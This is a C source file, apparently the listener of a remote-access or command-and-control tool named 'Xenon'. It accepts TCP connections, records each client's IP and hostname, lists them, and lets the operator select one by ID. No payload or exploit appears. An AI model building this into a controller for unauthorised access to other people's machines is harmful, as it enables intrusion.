#include "xenonhelper.h"
#include "../Xenon/xenon.h"

extern addrctx CTX;

CLIENT clients[NCLIENTSMAX];

int GetClient(void)
{

    int count = 0;

    SOCKET Sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(CTX.dstport);

    bind(Sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr));

    listen(Sock, SOMAXCONN);
    printf(PURPLE"\nLooking for connections on port ["BLUE"%d"PURPLE"]"BLACK, CTX.dstport);

    while (1)
    {

        struct sockaddr_in ClientAddr;
        int len = sizeof(ClientAddr);

        SOCKET clientSock = accept(Sock, (SOCKADDR*)&ClientAddr, &len);

        if (clientSock == INVALID_SOCKET)
            continue;

        if (count >= NCLIENTSMAX)
        {
            printf(PURPLE"\a\nMAX amount of connections reached, Closing socket"BLACK);
            closesocket(clientSock);
            continue;
        }

        clients[count].Socket = clientSock;
        strcpy(clients[count].IP, inet_ntoa(ClientAddr.sin_addr));

        if (getnameinfo((SOCKADDR*)&ClientAddr, sizeof(ClientAddr), clients[count].HOST, sizeof(clients[count].HOST), NULL, 0, 0) != 0)
        {
            fprintf(stderr, "\r\n[-] Failed to retrive host name%d", WSAGetLastError());
            return -1;
        }

        count++;

        printf(GREEN"\n\n\n================== CLIENTS ==================\n"BLACK);
        printf(GREEN"\nID ------------------ IP ___________________ HOST"BLACK);

        for (int i = 0; i < count; i++)
        {
            printf(GREEN"\r\n[%d] ------------------ [%s] ------------------ [%s]"BLACK, i, clients[i].IP, clients[i].HOST);
        }

		//recv(clientSock, NULL, 0, 0);

    }

    closesocket(Sock);
    WSACleanup();

    return 0;

}

int Select(char* ID)
{

    int id = atoi(ID);

    if (id < 0 || id >= NCLIENTSMAX || clients[id].Socket == 0)
    {
        fprintf(stderr, RED"\n[-] Invalid client ID."BLACK);
        return -1;
    }

    printf(GREEN"\n[+] Client [%s] selected."BLACK, clients[id].HOST);

    return id;

}